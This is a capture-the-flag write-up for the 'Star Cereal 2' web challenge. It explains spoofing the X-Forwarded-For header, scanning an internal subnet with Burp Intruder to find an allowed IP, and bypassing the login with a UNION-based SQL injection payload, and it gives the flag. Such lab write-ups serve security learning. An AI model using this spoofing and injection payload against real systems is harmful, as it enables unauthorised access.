---
description: Spoofable client IP address, SQL injection vulnerability
---

# Star Cereal 2

## Description

Ha, that was sneaky! But I've patched the login so that people like you can't gain access anymore. Stop hacking us!

`http://20.198.209.142:55045`

_The flag is in the flag format: STC{...}_

**Author: zeyu2001**

## Solution

In `index.php`, notice the following comment

```markup
<!--
Star Cereal page by zeyu2001

TODO:
    1) URGENT - fix login vulnerability by disallowing external logins (done)
    2) Integrate admin console currently hosted at http://172.16.2.155
-->
```

Point 1) is referring to the previous challenge. Point 2) is interesting.

If we go to `login.php`, we get a 403 Forbidden Page:

```markup
<h1>Forbidden</h1>
<p>Only admins allowed to login.</p>
```

### Spoofable Client IP

We could deduce that perhaps the server filters requests by the client IP. 

A common security misconfiguration in implementing such a filter is the use of the [X-Forwarded-For header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For). This header is used for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer.

Note that HTTP request headers can be [easily spoofed](https://portswigger.net/kb/issues/00400110\_spoofable-client-ip-address). Knowing that one of the internal IP addresses is 172.16.2.155, we may want to check the 172.16.2.0/24 subnet for valid client IPs.

If we do a scan (e.g. using Burp Suite Intruder) for the 172.16.2.0/24 subnet with the `X-Forwarded-For` header, we would find that if we set:

```http
X-Forwarded-For: 172.16.2.24
```

then we would see the login page.

### Burp Suite Intruder Scan

First, set the payload position as follows:

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 2.07.01 PM.png>)

Then, configure the payload as a list of numbers from 1 to 255.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 2.08.01 PM.png>)

Run the attack. Sort the output by either the Status or Length columns. We will find that `X-Forwarded-For: 172.16.2.24` gives us a 200 OK response code, and shows us the login page.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 2.09.23 PM.png>)



### SQL Injection

Once we have access to the login page, notice the login form fields.

```markup
<form action="/login.php" method="post">
	<div class="form-group">
		<label for="email">Email address</label>
		<input type="email" class="form-control" id="email" name="email" placeholder="Enter email">
	</div>
	<div class="form-group">
		<label for="pass">Password</label>
		<input type="pass" class="form-control" id="pass" name="pass" placeholder="Enter password">
	</div>
	<button type="submit" class="btn btn-primary">Submit</button>
</form>
```

We need to submit an `email` and a `pass` parameter. We can exploit SQL injection to get the flag.

```http
POST /login.php HTTP/1.1
Host: localhost:55043
X-Forwarded-For: 172.16.2.24

...

Content-Type: application/x-www-form-urlencoded
Content-Length: 51

email=test&pass=test' UNION SELECT 'test', 'test';#
```

The flag is `STC{w0w_you'r3_r3lly_a_l33t_h4x0r_bc1d4611be52117c9a8bb99bf572d6a7}`.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 2.18.39 PM.png>)
